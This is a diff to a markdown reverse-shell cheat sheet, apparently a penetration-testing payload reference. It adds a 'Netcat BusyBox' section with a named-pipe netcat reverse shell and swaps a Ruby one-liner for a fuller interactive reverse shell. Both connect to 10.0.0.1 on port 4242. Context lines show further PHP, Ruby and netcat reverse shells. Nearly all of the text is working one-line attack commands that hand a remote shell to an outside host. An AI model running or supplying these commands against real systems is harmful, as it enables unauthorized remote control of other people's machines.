@@ -17,6 +17,7 @@
     * [Lua](#lua)
     * [Ncat](#ncat)
     * [Netcat OpenBsd](#netcat-openbsd)
+    * [Netcat BusyBox](#netcat-busybox)
     * [Netcat Traditional](#netcat-traditional)
     * [NodeJS](#nodejs)
     * [OpenSSL](#openssl)
@@ -131,7 +132,7 @@ php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
 
 NOTE: Windows only
 ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -155,6 +156,12 @@ nc -c bash 10.0.0.1 4242
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+### Netcat BusyBox
+
+```bash
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
 ### Ncat
